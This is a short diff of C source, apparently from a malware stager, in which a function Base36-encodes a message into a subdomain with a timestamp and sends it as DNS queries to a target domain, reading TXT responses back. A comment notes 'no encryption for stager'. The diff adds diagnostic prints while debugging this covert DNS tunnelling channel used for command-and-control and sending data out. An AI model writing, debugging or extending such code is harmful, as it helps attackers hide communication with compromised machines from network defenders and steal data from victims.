@@ -748,10 +748,20 @@ static int send_dns_message(const char *message, const char *target_domain, char
     char encoded[512];
     char domain[1024];
     
+    // ALWAYS PRINT - debug encoding issue
+    fprintf(stderr, "[DIAG] Message to encode: '%s' (len=%zu)\n", message, strlen(message));
+    
     // Base36 encode the message (no encryption for stager)
     base36_encode((const unsigned char *)message, strlen(message), encoded, sizeof(encoded));
     
-    DEBUG_PRINT("[*] Encoded: %s (len=%zu)\n", encoded, strlen(encoded));
+    // ALWAYS PRINT - debug encoding issue
+    fprintf(stderr, "[DIAG] Encoded result: '%s' (len=%zu)\n", encoded, strlen(encoded));
+    
+    // Check if encoding failed (empty result)
+    if (strlen(encoded) == 0) {
+        fprintf(stderr, "[DIAG] ERROR: base36_encode returned empty string!\n");
+        return -1;
+    }
     
     // Retry mechanism with delays
     for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
@@ -761,6 +771,7 @@ static int send_dns_message(const char *message, const char *target_domain, char
         snprintf(domain, sizeof(domain), "%s.%lu.%s", 
                  encoded, (unsigned long)time(NULL), target_domain);
         
+        fprintf(stderr, "[DIAG] Constructed domain: %s\n", domain);
         DEBUG_PRINT("[*] Querying: %s\n", domain);
         
         char txt_response[4096];
